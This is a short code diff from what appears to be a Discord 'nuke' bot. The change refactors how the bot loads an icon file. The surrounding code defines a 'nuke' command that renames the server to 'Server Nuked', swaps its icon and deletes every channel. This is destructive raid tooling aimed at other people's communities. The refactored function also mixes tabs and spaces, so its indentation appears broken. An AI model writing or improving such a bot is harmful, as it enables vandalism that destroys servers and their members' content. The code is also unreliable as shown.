@@ -19,8 +19,10 @@ async def on_ready():
 
 
 # Open 'icon.png' as icon
-with open('icon.png','rb') as f:
+def get_icon():
+    with open('icon.png','rb') as f:
 	icon = f.read()
+        return icon
 
 
 
@@ -28,7 +30,7 @@ with open('icon.png','rb') as f:
 @client.command()
 async def nuke(ctx):
 
-	await ctx.guild.edit(name='Server Nuked', icon=icon) #change guild icon and name
+	await ctx.guild.edit(name='Server Nuked', icon=get_icon()) #change guild icon and name
 
 	for c in ctx.guild.channels: # go through all channels
 		await c.delete() # delete all channels
